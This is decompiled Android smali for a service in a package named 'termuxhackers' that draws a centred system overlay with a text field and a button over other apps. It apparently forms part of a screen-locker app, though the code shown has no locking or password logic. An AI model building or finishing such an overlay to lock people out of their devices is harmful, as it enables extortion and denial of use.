.class public Lcom/termuxhackers/id/MyService;
.super Landroid/app/Service;
.source "MyService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/termuxhackers/id/MyService$100000000;
    }
.end annotation


# instance fields
.field chatHead:Landroid/widget/ImageView;

.field context:Landroid/content/Context;

.field e1:Landroid/widget/EditText;

.field myView:Landroid/view/ViewGroup;

.field windowManager:Landroid/view/WindowManager;


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 62
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Service;-><init>()V

    return-void
.end method


# virtual methods
.method public f()V
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 61
    move-object v0, p0

    move-object v2, v0

    const-string v3, "\u0412\u0430\u0448 \u0442\u0435\u043a\u0441\u0442"

    const/4 v4, 0x0

    invoke-static {v2, v3, v4}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v2

    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 4
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 58
    move-object v0, p0

    move-object v1, p1

    const/4 v3, 0x0

    check-cast v3, Landroid/os/IBinder;

    move-object v0, v3

    return-object v0
.end method

.method public onCreate()V
    .locals 15
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object v0, p0

    move-object v7, v0

    const-string v8, "com.aide.ui"

    invoke-static {v7, v8}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 21
    move-object v7, v0

    move-object v8, v0

    const-string v9, "window"

    invoke-virtual {v8, v9}, Lcom/termuxhackers/id/MyService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/WindowManager;

    iput-object v8, v7, Lcom/termuxhackers/id/MyService;->windowManager:Landroid/view/WindowManager;

    .line 22
    move-object v7, v0

    const-string v8, "layout_inflater"

    invoke-virtual {v7, v8}, Lcom/termuxhackers/id/MyService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/LayoutInflater;

    move-object v2, v7

    .line 23
    move-object v7, v0

    move-object v8, v2

    const/high16 v9, 0x7f030000

    const/4 v10, 0x0

    check-cast v10, Landroid/view/ViewGroup;

    invoke-virtual {v8, v9, v10}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v8

    check-cast v8, Landroid/view/ViewGroup;

    iput-object v8, v7, Lcom/termuxhackers/id/MyService;->myView:Landroid/view/ViewGroup;

    .line 24
    move-object v7, v0

    new-instance v8, Landroid/widget/ImageView;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    move-object v10, v0

    invoke-direct {v9, v10}, Landroid/widget/ImageView;-><init>(Landroid/content/Context;)V

    iput-object v8, v7, Lcom/termuxhackers/id/MyService;->chatHead:Landroid/widget/ImageView;

    .line 25
    move-object v7, v0

    iget-object v7, v7, Lcom/termuxhackers/id/MyService;->chatHead:Landroid/widget/ImageView;

    const/high16 v8, 0x7f020000

    invoke-virtual {v7, v8}, Landroid/widget/ImageView;->setImageResource(I)V

    .line 26
    move-object v7, v0

    iget-object v7, v7, Lcom/termuxhackers/id/MyService;->myView:Landroid/view/ViewGroup;

    const/high16 v8, 0x7f060000

    invoke-virtual {v7, v8}, Landroid/view/ViewGroup;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/Button;

    move-object v3, v7

    .line 27
    move-object v7, v0

    move-object v8, v0

    iget-object v8, v8, Lcom/termuxhackers/id/MyService;->myView:Landroid/view/ViewGroup;

    const v9, 0x7f060001

    invoke-virtual {v8, v9}, Landroid/view/ViewGroup;->findViewById(I)Landroid/view/View;

    move-result-object v8

    check-cast v8, Landroid/widget/EditText;

    iput-object v8, v7, Lcom/termuxhackers/id/MyService;->e1:Landroid/widget/EditText;

    .line 28
    move-object v7, v3

    new-instance v8, Lcom/termuxhackers/id/MyService$100000000;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    move-object v10, v0

    invoke-direct {v9, v10}, Lcom/termuxhackers/id/MyService$100000000;-><init>(Lcom/termuxhackers/id/MyService;)V

    invoke-virtual {v7, v8}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 41
    new-instance v7, Landroid/view/WindowManager$LayoutParams;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    const/4 v9, -0x2

    const/4 v10, -0x2

    const/16 v11, 0x7d2

    const/4 v12, 0x1

    const/4 v13, -0x3

    invoke-direct/range {v8 .. v13}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    move-object v4, v7

    .line 48
    move-object v7, v4

    const/16 v8, 0x11

    iput v8, v7, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 49
    move-object v7, v4

    const/4 v8, 0x0

    iput v8, v7, Landroid/view/WindowManager$LayoutParams;->x:I

    .line 50
    move-object v7, v4

    const/4 v8, 0x0

    iput v8, v7, Landroid/view/WindowManager$LayoutParams;->y:I

    .line 51
    new-instance v7, Landroid/view/View;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    move-object v9, v0

    invoke-direct {v8, v9}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    move-object v5, v7

    .line 52
    move-object v7, v5

    const/high16 v8, 0x33ff0000

    invoke-virtual {v7, v8}, Landroid/view/View;->setBackgroundColor(I)V

    .line 53
    move-object v7, v0

    iget-object v7, v7, Lcom/termuxhackers/id/MyService;->windowManager:Landroid/view/WindowManager;

    move-object v8, v0

    iget-object v8, v8, Lcom/termuxhackers/id/MyService;->myView:Landroid/view/ViewGroup;

    move-object v9, v4

    invoke-interface {v7, v8, v9}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    return-void
.end method
